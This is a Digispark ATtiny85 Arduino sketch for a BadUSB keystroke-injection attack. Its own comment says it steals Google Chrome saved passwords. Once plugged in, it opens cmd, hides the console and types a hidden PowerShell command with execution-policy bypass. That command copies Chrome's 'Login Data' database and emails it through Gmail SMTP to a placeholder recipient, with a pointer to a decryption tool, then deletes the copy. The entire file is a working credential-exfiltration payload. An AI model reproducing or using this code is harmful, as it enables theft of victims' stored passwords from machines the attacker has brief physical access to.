#include "DigiKeyboard.h"

// For Digispark Attiny 85
// Steals encoded Google Chrome passwords and sends to mail


void setup() {
	
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(100);
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  DigiKeyboard.print("MODE CON: COLS=15 LINES=1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  
  DigiKeyboard.print("COLOR EF");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  
  DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"copy $env:userprofile'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data' pass.sqlite; $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('FROM@gmail.com', 'FROMPass'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'FROM@gmail.com'; $ReportEmail.To.Add('TO@gmail.com'); $ReportEmail.Subject = 'DigiSpark - User: ' + $env:username; $ReportEmail.Body = 'Chrome passwords in file pass.sqlite. To decrypt use: https://github.com/byt3bl33d3r/chrome-decrypter - Regards Your Digispark'; $ReportEmail.Attachments.Add('pass.sqlite'); $SMTPInfo.Send($ReportEmail); del pass.sqlite\""));
  
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  pinMode(0, OUTPUT);
  pinMode(1, OUTPUT);
  for (;;){
    digitalWrite(0, HIGH);
    digitalWrite(1, HIGH);
    delay(100); 
	
    digitalWrite(0, LOW); 
    digitalWrite(1, LOW); 
    delay(100); 
  }
}

void loop() {
  
}